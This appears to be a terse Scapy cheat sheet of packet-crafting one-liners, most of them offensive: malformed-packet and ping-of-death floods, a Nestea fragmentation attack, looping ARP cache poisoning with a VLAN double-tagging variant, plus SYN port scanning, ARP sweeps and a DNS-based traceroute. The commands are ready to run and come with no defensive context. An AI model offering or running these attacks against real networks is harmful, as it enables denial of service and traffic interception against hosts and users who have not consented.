# malformed packets
send(IP(dst="127.0.0.1", ihl=2, version=3)/ICMP())

# ping od death
for p in fragment(IP(dst="127.0.0.1")/ICMP()/("X"*60000)):
    send(p)

# nestea attck
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
send(IP(dst=target, id=42, frag=48)/("X"*116))
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))

# class ARP cache poisoning
send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )

# ARP cache poisoning with double 802.1q encapsulation
send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )

# packet scanner
res,unans = sr( IP(dst="target")/TCP(flags="S", dport=(1,1024)) )

# open ports receive
res.nsummary( filter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )

# sending ARP scan
res,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"))

# ARP scan summary
res.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%"))

# traceroute
res,unans = sr(IP(dst="target", ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname="test.com"))



